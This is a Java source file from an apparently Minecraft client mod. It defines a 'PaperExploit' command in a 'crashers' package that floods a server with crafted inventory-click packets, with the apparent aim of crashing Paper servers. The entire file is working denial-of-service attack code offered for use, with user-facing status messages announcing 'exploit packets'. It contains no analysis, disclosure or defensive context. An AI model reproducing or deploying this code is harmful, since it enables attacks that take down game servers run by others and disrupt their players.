package me.nullnet.voxelclient.crashers;

import com.mojang.brigadier.arguments.IntegerArgumentType;
import com.mojang.brigadier.context.CommandContext;
import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import me.nullnet.voxelclient.utils.ColorUtil;
import net.fabricmc.fabric.api.client.command.v2.FabricClientCommandSource;
import net.minecraft.class_1713;
import net.minecraft.class_1799;
import net.minecraft.class_1802;
import net.minecraft.class_2813;
import net.minecraft.class_310;

public class PaperExploit {
   private static final class_310 client = class_310.method_1551();

   public static int execute(CommandContext<FabricClientCommandSource> context) {
      int packets = IntegerArgumentType.getInteger(context, "packets");
      long now = System.currentTimeMillis();
      ((FabricClientCommandSource)context.getSource()).sendFeedback(ColorUtil.translate("&8[&5&lVoxel&8] &8[&5PaperExploit&8] &7Sending exploit packets..."));
      (new Thread(() -> {
         try {
            Int2ObjectArrayMap<class_1799> itemMap = new Int2ObjectArrayMap();
            itemMap.put(0, new class_1799(class_1802.field_8094, 1));

            for(int i = 0; i < packets; ++i) {
               client.method_1562().method_52787(new class_2813(client.field_1724.field_7512.field_7763, client.field_1724.field_7512.method_37421(), 36, -1, class_1713.field_7791, client.field_1724.field_7512.method_34255().method_7972(), itemMap));
            }

            FabricClientCommandSource var10000 = (FabricClientCommandSource)context.getSource();
            String var10001 = "&8[&5&lVoxel&8] &8[&5PaperExploit&8] &7Sent &5%d &7exploit packets. &8[&6".formatted(new Object[]{packets});
            var10000.sendFeedback(ColorUtil.translate(var10001 + (System.currentTimeMillis() - now) + "ms&8]"));

            try {
               Thread.sleep(50L);
            } catch (InterruptedException var6) {
               ((FabricClientCommandSource)context.getSource()).getPlayer().method_7353(ColorUtil.translate("&8[&5&lVoxel&8] &8[&5PaperExploit&8] &7Unable to sleep &650ms&7."), false);
            }
         } catch (NullPointerException var7) {
         }

      })).start();
      return 1;
   }
}
